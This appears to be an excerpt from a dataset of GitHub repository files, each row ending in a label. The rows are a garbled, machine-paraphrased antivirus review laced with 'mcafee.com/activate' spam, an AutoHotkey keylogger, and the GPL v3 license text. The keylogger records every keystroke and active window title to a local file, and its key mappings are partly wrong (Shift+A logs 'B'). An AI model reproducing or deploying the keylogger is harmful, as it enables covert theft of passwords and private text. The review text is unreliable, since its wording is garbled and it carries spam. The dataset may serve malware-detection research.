MRG-Effitas, taking note of what level of them it blocked. Items get equivalent kudos for anticipating all entrance to the vindictive URL and for clearing out the malware during download.    A few items win completely outstanding evaluations from the autonomous labs, yet don't toll too in our grasp on tests. In such cases, we concede to the labs, as they carry altogether more prominent assets to their testing. Need to know more? You can dive in for a point by point portrayal of how we test security programming.    Multilayered Malware Protection    Antivirus items separate themselves by going past the fundamentals of on-request examining and ongoing malware insurance. Some rate URLs that you visit or that appear in indexed lists, utilizing a red-yellow-green shading coding framework. Some effectively square procedures on your framework from associating with known malware-facilitating URLs or with false (phishing) pages.    Programming has imperfections, and here and there those blemishes influence your mcafee security. Judicious clients keep Windows and all projects fixed, fixing those imperfections at the earliest opportunity. The defenselessness output offered by some antivirus items can check that every vital patches are available, and even apply any that are absent.    Spyware comes in numerous structures, from concealed projects that log your each keystroke to Trojans that take on the appearance of legitimate projects while mining your own information. Any antivirus should deal with spyware, alongside every other sort of malware, yet some incorporate specific segments gave to spyware insurance.    You expect an antivirus to recognize and dispose of terrible projects, and to disregard great projects. Shouldn't something be said about questions, programs it can't distinguish as positive or negative? Conduct based discovery can, in principle, secure you against malware that is so new scientists have never experienced it. In any case, this isn't generally an unmixed gift. It's normal for social discovery frameworks to hail numerous harmless practices performed by genuine projects.    Whitelisting is another way to deal with the issue of obscure projects. A whitelist-based security framework just permits realized great projects to run. Questions are prohibited. This mode sometimes falls short for all circumstances, however it very well may be helpful. Sandboxing gives obscure projects a chance to run, however it segregates them from full access to your framework, so they can't do lasting damage. These different added layers serve to upgrade your assurance against malware.    What's the Best Malware Protection?    mcafee.com/activate antivirus would it be advisable for you to pick? You have an abundance of choices. Kaspersky Anti-Virus and Bitdefender Antivirus Plus routinely take impeccable or close ideal scores from the autonomous antivirus testing labs. A solitary membership for AntiVirus Plus gives you a chance to introduce security on the majority of your Windows, Android, Mac OS, and iOS gadgets. What's more, its unordinary conduct based recognition innovation implies Webroot SecureAnywhere Antivirus is the most diminutive antivirus around. We've named these four Editors' Choice for business antivirus, however they're by all account not the only items worth thought. Peruse the surveys of our top of the line items, and afterward settle on your own choice.    Note that we have assessed a lot more antivirus utilities than we could incorporate into the diagram of top items. On the off chance that your preferred programming isn't recorded there, odds are we reviewed it. The blurbs beneath incorporate each item that oversaw 3.5 stars or better. Every one of the utilities recorded in this component are Windows antivirus applications. In case you're a macOS client, don't lose hope, be that as it may; PCMag has a different gathering devoted exclusively to the best Mac antivirus programming.""}",,1
0,https://github.com/gobdonuts/teatyy.git,"; ; AutoHotkey Version: 1.x ; Author: A.N.Other <myemail@nowhere.com> ; Original Forum: http://www.autohotkey.com/board/topic/30294-simple-key-stroke-recorder/ ; Script Function: ;    Template script (you can customize this template by editing ""ShellNew\\Template.ahk"" in your Windows folder) ;  /* Copyright MIT  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. */  #NoEnv SendMode Input SetWorkingDir %A_ScriptDir%   ; Below sets the filename. Currently, ""keylogger"" plus the date in the below format. It also always saves to the same folder as this script. Feel free to adjust the name convention as desired  FormatTime, DateFile, YYYYMMDDHH24MISS, MM-dd-yyyy filename := % ""keylogger"" DateFile  ; Detect hidden windows since they can be active ; (e.g. AutoHotkey main window while using Menu,MenuName,Show.) DetectHiddenWindows, On  ; First time it is run, it saves the fully formatted time.  FormatTime, TimeString start := ""`n`n ---------------------`n`n Startin at: "" . TimeString . ""`n`n""  FileAppend, ( %start% ), %A_ScriptDir%\\%filename%.txt  Gui +LastFound hWnd := WinExist() DllCall( ""RegisterShellHookWindow"", UInt,Hwnd ) MsgNum := DllCall( ""RegisterWindowMessage"", Str,""SHELLHOOK"" ) OnMessage( MsgNum, ""ShellMessage"" )   ShellMessage( wParam,lParam ) { WinGetTitle, title, ahk_id %lParam% Sleep, 1000 If (wParam=32772) { ;HSHELL_WINDOWACTIVATED FormatTime, TimeString, YYYYMMDDHH24MISS, ss:mm:hhtt-MM-dd-yyyy  /* This saves the window and time whenever the window changes. You can adjust the time format the line above, or remove the time altogether by removing %TimeString% below. */  FileAppend, ( `n Window Title: %Title% %TimeString% `n ), %A_ScriptDir%\\%filename%.txt } }   ~a::fileappend, a, %filename%.txt ~b::fileappend, b, %filename%.txt ~c::fileappend, c, %filename%.txt ~d::fileappend, d, %filename%.txt ~e::fileappend, e, %filename%.txt ~f::fileappend, f, %filename%.txt ~g::fileappend, g, %filename%.txt ~h::fileappend, h, %filename%.txt ~i::fileappend, i, %filename%.txt ~j::fileappend, j, %filename%.txt ~k::fileappend, k, %filename%.txt ~l::fileappend, l, %filename%.txt ~m::fileappend, m, %filename%.txt ~n::fileappend, n, %filename%.txt ~o::fileappend, o, %filename%.txt ~p::fileappend, p, %filename%.txt ~q::fileappend, q, %filename%.txt ~r::fileappend, r, %filename%.txt ~s::fileappend, s, %filename%.txt ~t::fileappend, t, %filename%.txt ~u::fileappend, u, %filename%.txt ~v::fileappend, v, %filename%.txt ~w::fileappend, w, %filename%.txt ~x::fileappend, x, %filename%.txt ~y::fileappend, y, %filename%.txt ~z::fileappend, z, %filename%.txt ~+A::fileappend, B, %filename%.txt ~+B::fileappend, B, %filename%.txt ~+C::fileappend, C, %filename%.txt ~+D::fileappend, D, %filename%.txt ~+E::fileappend, E, %filename%.txt ~+F::fileappend, F, %filename%.txt ~+G::fileappend, G, %filename%.txt ~+H::fileappend, H, %filename%.txt ~+I::fileappend, I, %filename%.txt ~+J::fileappend, J, %filename%.txt ~+K::fileappend, K, %filename%.txt ~+L::fileappend, L, %filename%.txt ~+M::fileappend, M, %filename%.txt ~+N::fileappend, N, %filename%.txt ~+O::fileappend, O, %filename%.txt ~+P::fileappend, P, %filename%.txt ~+Q::fileappend, Q, %filename%.txt ~+R::fileappend, R, %filename%.txt ~+S::fileappend, S, %filename%.txt ~+T::fileappend, T, %filename%.txt ~+U::fileappend, U, %filename%.txt ~+V::fileappend, V, %filename%.txt ~+W::fileappend, W, %filename%.txt ~+X::fileappend, X, %filename%.txt ~+Y::fileappend, Y, %filename%.txt ~+Z::fileappend, Z, %filename%.txt ~`::fileappend, `, %filename%.txt ~!::fileappend, !, %filename%.txt ~@::fileappend, @, %filename%.txt ~#::fileappend, #, %filename%.txt ~$::fileappend, $, %filename%.txt ~^::fileappend, ^, %filename%.txt ~&::fileappend, &, %filename%.txt ~*::fileappend, *, %filename%.txt ~(::fileappend, (, %filename%.txt ~)::fileappend, ), %filename%.txt ~-::fileappend, -, %filename%.txt ~_::fileappend, _, %filename%.txt ~=::fileappend, =, %filename%.txt ~+::fileappend, +, %filename%.txt ~[::fileappend, [, %filename%.txt ~{::fileappend, {, %filename%.txt ~]::fileappend, ], %filename%.txt ~}::fileappend, }, %filename%.txt ~\\::fileappend, \\, %filename%.txt ~|::fileappend, |, %filename%.txt ~;::fileappend, ;, %filename%.txt ~\'::fileappend, \', %filename%.txt ~<::fileappend, <, %filename%.txt ~.::fileappend, ., %filename%.txt ~>::fileappend, >, %filename%.txt ~/::fileappend, /, %filename%.txt ~?::fileappend, ?, %filename%.txt ~enter::fileappend, `n, %filename%.txt ~space::fileappend, %A_Space%, %filename%.txt ~tab::fileappend, {tab}, %filename%.txt ~backspace::fileappend, {Back}, %filename%.txt ~1::fileappend, 1, %filename%.txt ~2::fileappend, 2, %filename%.txt ~3::fileappend, 3, %filename%.txt ~4::fileappend, 4, %filename%.txt ~5::fileappend, 5, %filename%.txt ~6::fileappend, 6, %filename%.txt ~7::fileappend, 7, %filename%.txt ~8::fileappend, 8, %filename%.txt ~9::fileappend, 9, %filename%.txt ~0::fileappend, 0, %filename%.txt  ",,1
0,https://github.com/frankmalcolmkembery/GNU-GENERAL-PUBLIC-LICENSE-Version-3-29-June-2007-Copy.git,"                    GNU GENERAL PUBLIC LICENSE                        Version 3, 29 June 2007   Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>  Everyone is permitted to copy and distribute verbatim copies  of this license document, but changing it is not allowed.                              Preamble    The GNU General Public License is a free, copyleft license for software and other kinds of works.    The licenses for most software and other practical works are designed to take away your freedom to share and change the works.  By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users.  We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors.  You can apply it to your programs, too.    When we speak of free software, we are referring to freedom, not price.  Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things.    To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights.  Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others.    For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received.  You must make sure that they, too, receive or can get the source code.  And you must show them these terms so they know their rights.    Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you legal permission to copy, distribute and/or modify it.    For the developers\' and authors\' protection, the GPL clearly explains that there is no warranty for this free software.  For both users\' and authors\' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions.    Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so.  This is fundamentally incompatible with the aim of protecting users\' freedom to change the software.  The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable.  Therefore, we have designed this version of the GPL to prohibit the practice for those products.  If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users.    Finally, every program is threatened constantly by software patents. States should not allow patents to restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary.  To prevent this, the GPL assures that patents cannot be used to render the program non-free.    The precise terms and conditions for copying, distribution and modification follow.                         TERMS AND CONDITIONS    0. Definitions.    ""This License"" refers to version 3 of the GNU General Public License.    ""Copyright"" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks.    ""The Program"" refers to any copyrightable work licensed under this License.  Each licensee is addressed as ""you"".  ""Licensees"" and ""recipients"" may be individuals or organizations.    To ""modify"" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy.  The resulting work is called a ""modified version"" of the earlier work or a work ""based on"" the earlier work.    A ""covered work"" means either the unmodified Program or a work based on the Program.    To ""propagate"" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy.  Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well.    To ""convey"" a work means any kind of propagation that enables other parties to make or receive copies.  Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying.    An interactive user interface displays ""Appropriate Legal Notices"" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License.  If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion.    1. Source Code.    The ""source code"" for a work means the preferred form of the work for making modifications to it.  ""Object code"" means any non-source form of a work.    A ""Standard Interface"" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language.    The ""System Libraries"" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form.  A ""Major Component"", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it.    The ""Corresponding Source"" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities.  However, it does not include the work\'s System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not part of the work.  For example, Corresponding Source includes interface definition files associated with source files for the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work.    The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source.    The Corresponding Source for a work in source code form is that same work.    2. Basic Permissions.    All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met.  This License explicitly affirms your unlimited permission to run the unmodified Program.  The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work.  This License acknowledges your rights of fair use or other equivalent, as provided by copyright law.    You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force.  You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright.  Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you.    Conveying under any other circumstances is permitted solely under the conditions stated below.  Sublicensing is not allowed; section 10 makes it unnecessary.    3. Protecting Users\' Legal Rights From Anti-Circumvention Law.    No covered work shall be deemed part of an effective technological measure under any applicable law fulfilling obligations under article 11 of the WIPO copyright treaty adopted on 20 December 1996, or similar laws prohibiting or restricting circumvention of such measures.    When you convey a covered work, you waive any legal power to forbid circumvention of technological measures to the extent such circumvention is effected by exercising rights under this License with respect to the covered work, and you disclaim any intention to limit operation or modification of the work as a means of enforcing, against the work\'s users, your or third parties\' legal rights to forbid circumvention of technological measures.    4. Conveying Verbatim Copies.    You may convey verbatim copies of the Program\'s source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice; keep intact all notices stating that this License and any non-permissive terms added in accord with section 7 apply to the code; keep intact all notices of the absence of any warranty; and give all recipients a copy of this License along with the Program.    You may charge any price or no price for each copy that you convey, and you may offer support or warranty protection for a fee.    5. Conveying Modified Source Versions.    You may convey a work based on the Program, or the modifications to produce it from the Program, in the form of source code under the terms of section 4, provided that you also meet all of these conditions:      a) The work must carry prominent notices stating that you modified     it, and giving a relevant date.      b) The work must carry prominent notices stating that it is     released under this License and any conditions added under section     7.  This requirement modifies the requirement in section 4 to     ""keep intact all notices"".      c) You must license the entire work, as a whole, under this     License to anyone who comes into possession of a copy.  This     License will therefore apply, along with any applicable section 7     additional terms, to the whole of the work, and all its parts,     regardless of how they are packaged.  This License gives no     permission to license the work in any other way, but it does not     invalidate such permission if you have separately received it.      d) If the work has interactive user interfaces, each must display     Appropriate Legal Notices; however, if the Program has interactive     interfaces that do not display Appropriate Legal Notices, your     work need not make them do so.    A compilation of a covered work with other separate and independent works, which are not by their nature extensions of the covered work, and which are not combined with it such as to form a larger program, in or on a volume of a storage or distribution medium, is called an ""aggregate"" if the compilation and its resulting copyright are not used to limit the access or legal rights of the compilation\'s users beyond what the individual works permit.  Inclusion of a covered work in an aggregate does not cause this License to apply to the other parts of the aggregate.    6. Conveying Non-Source Forms.    You may convey a covered work in object code form under the terms of sections 4 and 5, provided that you also convey the machine-readable Corresponding Source under the terms of this License, in one of these ways:      a) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by the     Corresponding Source fixed on a durable physical medium     customarily used for software interchange.      b) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by a     written offer, valid for at least three years and valid for as     long as you offer spare parts or customer support for that product     model, to give anyone who possesses the object code either (1) a     copy of the Corresponding Source for all the software in the     product that is covered by this License, on a durable physical     medium customarily used for software interchange, for a price no     more than your reasonable cost of physically performing this     conveying of source, or (2) access to copy the     Corresponding Source from a network server at no charge.      c) Convey individual copies of the object code with a copy of the     written offer to provide the Corresponding Source.  This     alternative is allowed only occasionally and noncommercially, and     only if you received the object code with such an offer, in accord     with subsection 6b.      d) Convey the object code by offering access from a designated     place (gratis or for a charge), and offer equivalent access to the     Corresponding Source in the same way through the same place at no     further charge.  You need not require recipients to copy the     Corresponding Source along with the object code.  If the place to     copy the object code is a network server, the Corresponding Source     may be on a different server (operated by you or a third party)     that supports equivalent copying facilities, provided you maintain     clear directions next to the object code saying where to find the     Corresponding Source.  Regardless of what server hosts the     Corresponding Source, you remain obligated to ensure that it is     available for as long as needed to satisfy these requirements.      e) Convey the object code using peer-to-peer transmission, provided     you inform other peers where the object code and Corresponding     Source of the work are being offered to the general public at no     charge under subsection 6d.    A separable portion of the object code, whose source code is excluded from the Corresponding Source as a System Library, need not be included in conveying the object code work.    A ""User Product"" is either (1) a ""consumer product"", which means any tangible personal property which is normally used for personal, family, or household purposes, or (2) anything designed or sold for incorporation into a dwelling.  In determining whether a product is a consumer product, doubtful cases shall be resolved in favor of coverage.  For a particular product received by a particular user, ""normally used"" refers to a typical or common use of that class of product, regardless of the status of the particular user or of the way in which the particular user actually uses, or expects or is expected to use, the product.  A product is a consumer product regardless of whether the product has substantial commercial, industrial or non-consumer uses, unless such uses represent the only significant mode of use of the product.    ""Installation Information"" for a User Product means any methods, procedures, authorization keys, or other information required to install and execute modified versions of a covered work in that User Product from a modified version of its Corresponding Source.  The information must suffice to ensure that the continued functioning of the modified object code is in no case prevented or interfered with solely because modification has been made.    If you convey an object code work under this section in, or with, or specifically for use in, a User Product, and the conveying occurs as part of a transaction in which the right of possession and use of the User Product is transferred to the recipient in perpetuity or for a fixed term (regardless of how the transaction is characterized), the Corresponding Source conveyed under this section must be accompanied by the Installation Information.  But this requirement does not apply if neither you nor any third party retains the ability to install modified object code on the User Product (for example, the work has been installed in ROM).    The requirement to provide Installation Information does not include a requirement to continue to provide support service, warranty, or updates for a work that has been modified or installed by the recipient, or for the User Product in which it has been modified or installed.  Access to a network may be denied when the modification itself materially and adversely affects the operation of the network or violates the rules and protocols for communication across the network.    Corresponding Source conveyed, and Installation Information provided, in accord with this section must be in a format that is publicly documented (and with an implementation available to the public in source code form), and must require no special password or key for unpacking, reading or copying.    7. Additional Terms.    ""Additional permissions"" are terms that supplement the terms of this License by making exceptions from one or more of its conditions. Additional permissions that are applicable to the entire Program shall be treated as though they were included in this License, to the extent that they are valid under applicable law.  If additional permissions apply only to part of the Program, that part may be used separately under those permissions, but the entire Program remains governed by this License without regard to the additional permissions.    When you convey a copy of a covered work, you may at your option remove any additional permissions from that copy, or from any part of it.  (Additional permissions may be written to require their own removal in certain cases when you modify the work.)  You may place additional permissions on material, added by you to a covered work, for which you have or can give appropriate copyright permission.    Notwithstanding any other provision of this License, for material you add to a covered work, you may (if authorized by the copyright holders of that material) supplement the terms of this License with terms:      a) Disclaiming warranty or limiting liability differently from the     terms of sections 15 and 16 of this License; or      b) Requiring preservation of specified reasonable legal notices or     author attributions in that material or in the Appropriate Legal     Notices displayed by works containing it; or      c) Prohibiting misrepresentation of the origin of that material, or     requiring that modified versions of such material be marked in     reasonable ways as different from the original version; or      d) Limiting the use for publicity purposes of names of licensors or     authors of the material; or      e) Declining to grant rights under trademark law for use of some     trade names, trademarks, or service marks; or      f) Requiring indemnification of licensors and authors of that     material by anyone who conveys the material (or modified versions of     it) with contractual assumptions of liability to the recipient, for     any liability that these contractual assumptions directly impose on     those licensors and authors.    All other non-permissive additional terms are considered ""further restrictions"" within the meaning of section 10.  If the Program as you received it, or any part of it, contains a notice stating that it is governed by this License along with a term that is a further restriction, you may remove that term.  If a license document contains a further restriction but permits relicensing or conveying under this License, you may add to a covered work material governed by the terms of that license document, provided that the further restriction does not survive such relicensing or conveying.    If you add terms to a covered work in accord with this section, you must place, in the relevant source files, a statement of the additional terms that apply to those files, or a notice indicating where to find the applicable terms.    Additional terms, permissive or non-permissive, may be stated in the form of a separately written license, or stated as exceptions; the above requirements apply either way.    8. Termination.    You may not propagate or modify a covered work except as expressly provided under this License.  Any attempt otherwise to propagate or modify it is void, and will automatically terminate your rights under this License (including any patent licenses granted under the third paragraph of section 11).    However, if you cease all violation of this License, then your license from a particular copyright holder is reinstated (a) provisionally, unless and until the copyright holder explicitly and finally terminates your license, and (b) permanently, if the copyright holder fails to notify you of the violation by some reasonable means prior to 60 days after the cessation.    Moreover, your license from a particular copyright holder is reinstated permanently if the copyright holder notifies you of the violation by some reasonable means, this is the first time you have received notice of violation of this License (for any work) from that copyright holder, and you cure the violation prior to 30 days after your receipt of the notice.    Termination of your rights under this section does not terminate the licenses of parties who have received copies or rights from you under this License.  If your rights have been terminated and not permanently reinstated, you do not qualify to receive new licenses for the same material under section 10.    9. Acceptance Not Required for Having Copies.    You are not required to accept this License in order to receive or run a copy of the Program.  Ancillary propagation of a covered work occurring solely as a consequence of using peer-to-peer transmission to receive a copy likewise does not require acceptance.  However, nothing other than this License grants you permission to propagate or modify any covered work.  These actions infringe copyright if you do not accept this License.  Therefore, by modifying or propagating a covered work, you indicate your acceptance of this License to do so.    10. Automatic Licensing of Downstream Recipients.    Each time you convey a covered work, the recipient automatically receives a license from the original licensors, to run, modify and propagate that work, subject to this License.  You are not responsible for enforcing compliance by third parties with this License.    An ""entity transaction"" is a transaction transferring control of an organization, or substantially all assets of one, or subdividing an organization, or merging organizations.  If propagation of a covered work results from an entity transaction, each party to that transaction who receives a copy of the work also receives whatever licenses to the work the party\'s predecessor in interest had or could give under the previous paragraph, plus a right to possession of the Corresponding Source of the work from the predecessor in interest, if the predecessor has it or can get it with reasonable efforts.    You may not impose any further restrictions on the exercise of the rights granted or affirmed under this License.  For example, you may not impose a license fee, royalty, or other charge for exercise of rights granted under this License, and you may not initiate litigation (including a cross-claim or counterclaim in a lawsuit) alleging that any patent claim is infringed by making, using, selling, offering for sale, or importing the Program or any portion of it.    11. Patents.    A ""contributor"" is a copyright holder who authorizes use under this License of the Program or a work on which the Program is based.  The work thus licensed is called the contributor\'s ""contributor version"".    A contributor\'s ""essential patent claims"" are all patent claims owned or controlled by the contributor, whether already acquired or hereafter acquired, that would be infringed by some manner, permitted by this License, of making, using, or selling its contributor version, but do not include claims that would be infringed only as a consequence of further modification of the contributor version.  For purposes of this definition, ""control"" includes the right to grant patent sublicenses in a manner consistent with the requirements of this License.    Each contributor grants you a non-exclusive, worldwide, royalty-free patent license under the contributor\'s essential patent claims, to make, use, sell, offer for sale, import and otherwise run, modify and propagate the contents of its contributor version.    In the following three paragraphs, a ""patent license"" is any express agreement or commitment, however denominated, not to enforce a patent (such as an express permission to practice a patent or covenant not to sue for patent infringement).  To ""grant"" such a patent license to a party means to make such an agreement or commitment not to enforce a patent against the party.    If you convey a covered work, knowingly relying on a patent license, and the Corresponding Source of the work is not available for anyone to copy, free of charge and under the terms of this License, through a publicly available network server or other readily accessible means, then you must either (1) cause the Corresponding Source to be so available, or (2) arrange to deprive yourself of the benefit of the patent license for this particular work, or (3) arrange, in a manner consistent with the requirements of this License, to extend the patent license to downstream recipients.  ""Knowingly relying"" means you have actual knowledge that, but for the patent license, your conveying the covered work in a country, or your recipient\'s use of the covered work in a country, would infringe one or more identifiable patents in that country that you have reason to believe are valid.    If, pursuant to or in connection with a single transaction or arrangement, you convey, or propagate by procuring conveyance of, a covered work, and grant a patent license to some of the parties receiving the covered work authorizing them to use, propagate, modify or convey a specific copy of the covered work, then the patent license you grant is automatically extended to all recipients of the covered work and works based on it.    A patent license is ""discriminatory"" if it does not include within the scope of its coverage, prohibits the exercise of, or is conditioned on the non-exercise of one or more of the rights that are specifically granted under this License.  You may not convey a covered work if you are a party to an arrangement with a third party that is in the business of distributing software, under which you make payment to the third party based on the extent of your activity of conveying the work, and under which the third party grants, to any of the parties who would receive the covered work from you, a discriminatory patent license (a) in connection with copies of the covered work conveyed by you (or copies made from those copies), or (b) primarily for and in connection with specific products or compilations that contain the covered work, unless you entered into that arrangement, or that patent license was granted, prior to 28 March 2007.    Nothing in this License shall be construed as excluding or limiting any implied license or other defenses to infringement that may otherwise be available to you under applicable patent law.    12. No Surrender of Others\' Freedom.    If conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License.  If you cannot convey a covered work so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not convey it at all.  For example, if you agree to terms that obligate you to collect a royalty for further conveying from those to whom you convey the Program, the only way you could satisfy both those terms and this License would be to refrain entirely from conveying the Program.    13. Use with the GNU Affero General Public License.    Notwithstanding any other provision of this License, you have permission to link or combine any covered work with a work licensed under version 3 of the GNU Affero General Public License into a single combined work, and to convey the resulting work.  The terms of this License will continue to apply to the part which is the covered work, but the special requirements of the GNU Affero General Public License, section 13, concerning interaction through a network will apply to the combination as such.    14. Revised Versions of this License.    The Free Software Foundation may publish revised and/or new versions of the GNU General Public License from time to time.  Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.    Each version is given a distinguishing version number.  If the Program specifies that a certain numbered version of the GNU General Public License ""or any later version"" applies to it, you have the option of following the terms and conditions either of that numbered version or of any later version published by the Free Software Foundation.  If the Program does not specify a version number of the GNU General Public License, you may choose any version ever published by the Free Software Foundation.    If the Program specifies that a proxy can decide which future versions of the GNU General Public License can be used, that proxy\'s public statement of acceptance of a version permanently authorizes you to choose that version for the Program.    Later license versions may give you additional or different permissions.  However, no additional obligations are imposed on any author or copyright holder as a result of your choosing to follow a later version.    15. Disclaimer of Warranty.    THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.    16. Limitation of Liability.    IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.    17. Interpretation of Sections 15 and 16.    If the disclaimer of warranty and limitation of liability provided above cannot be given local legal effect according to their terms, reviewing courts shall apply local law that most closely approximates an absolute waiver of all civil liability in connection with the Program, unless a warranty or assumption of liability accompanies a copy of the Program in return for a fee.                       END OF TERMS AND CONDITIONS              How to Apply These Terms to Your New Programs    If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.    To do so, attach the following notices to the program.  It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      {one line to give the program\'s name and a brief idea of what it does.}     Copyright (C) {year}  {name of author}      This program is free software: you can redistribute it and/or modify     it under the terms of the GNU General Public License as published by     the Free Software Foundation, either version 3 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU General Public License for more details.      You should have received a copy of the GNU General Public License     along with this program.  If not, see <http://www.gnu.org/licenses/>.  Also add information on how to contact you by electronic and paper mail.    If the program does terminal interaction, make it output a short notice like this when it starts in an interactive mode:      {project}  Copyright (C) {year}  {fullname}     This program comes with ABSOLUTELY NO WARRANTY; for details type `show w\'.     This is free software, and you are welcome to redistribute it     under certain conditions; type `show c\' for details.  The hypothetical commands `show w\' and `show c\' should show the appropriate parts of the General Public License.  Of course, your program\'s commands might be different; for a GUI interface, you would use an ""about box"".    You should also get your employer (if you work as a programmer) or school, if any, to sign a ""copyright disclaimer"" for the program, if necessary. For more information on this, and how to apply and follow the GNU GPL, see <http://www.gnu.org/licenses/>.    The GNU General Public License does not permit incorporating your program into proprietary programs.  If your program is a subroutine library, you may consider it more useful to permit linking proprietary applications with the library.  If this is what you want to do, use the GNU Lesser General Public License instead of this License.  But first, please read <http://www.gnu.org/philosophy/why-not-lgpl.html>.",,1
